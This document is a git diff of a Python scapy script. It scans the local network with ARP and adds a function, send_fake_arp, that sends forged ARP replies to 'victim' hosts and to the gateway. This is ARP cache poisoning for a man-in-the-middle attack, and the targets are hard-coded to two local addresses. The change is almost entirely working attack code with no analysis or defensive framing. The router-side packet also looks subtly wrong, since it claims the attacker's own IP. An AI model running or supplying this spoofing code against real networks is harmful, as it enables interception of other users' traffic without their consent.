@@ -1,14 +1,16 @@
 #!/usr/bin/env python3
 
-
 import netifaces as ni
 from math import log2
 from scapy.all import ARP, Ether, srp, send
 
 arp_table = {}
+hot_ip = None
+gtw_ip = None
+hot_mc = None
 
 def arp_scan():
-	
+	global arp_table, hot_ip, gtw_ip, hot_mc	
 	# gtw_ip = 192.168.0.1
 	# itf_if = (Interface Info)
 	#      {'addr': '192.168.0.141', 'netmask': '255.255.255.0', 'broadcast': '192.168.0.255'} 
@@ -20,6 +22,7 @@ def arp_scan():
 	gateway = ni.gateways()[ni.AF_INET][0]
 	gtw_ip = gateway[0]
 	itf_if = ni.ifaddresses(gateway[1])[ni.AF_INET][0]
+	hot_mc = ni.ifaddresses(gateway[1])[ni.AF_LINK][0]['addr']
 	hot_ip = itf_if['addr']
 	msk_ln = 32 - sum([int(log2(256 - int(i))) for i in itf_if['netmask'].split('.')])
 	
@@ -37,16 +40,37 @@ def arp_scan():
 	print("IP Address       MAC Address         ")
 	print("-------------------------------------")
 	for i in arp_table:
-		if i == gtw_ip or i == hot_ip: continue;
+		# if i == gtw_ip or i == hot_ip: continue;
 		print("%-15s %18s" % (i, arp_table[i]['mac']))
 	
 	print("-------------------------------------")
 	return
 
 
+def send_fake_arp():
+	'''
+	pdst: is where the ARP packet should go (target),
+	psrc: is the IP to update in the target's arp table,
+	hwsrc: is the MAC corresponding to psrc, to update in the target's arp table
+	hwdst: destination hardware address
+	'''
+	rt_mac = arp_table[gtw_ip]['mac']
+
+	for i in arp_table:	
+		if i == gtw_ip or i == hot_ip: continue;
+		arp_to_victim = ARP(op=2, pdst=i,      hwdst=arp_table[i]['mac'], psrc=gtw_ip, hwsrc=hot_mc)
+		arp_to_router = ARP(op=2, pdst=gtw_ip, hwdst=rt_mac,              psrc=hot_ip, hwsrc=hot_mc)
+		
+		if i != '192.168.0.163' and i != '192.168.0.141': continue;
+
+		send(arp_to_victim, verbose=False)
+		send(arp_to_router, verbose=False)
+
 
 def main():
 	arp_scan()
+	send_fake_arp()
+
 	return 
 
 
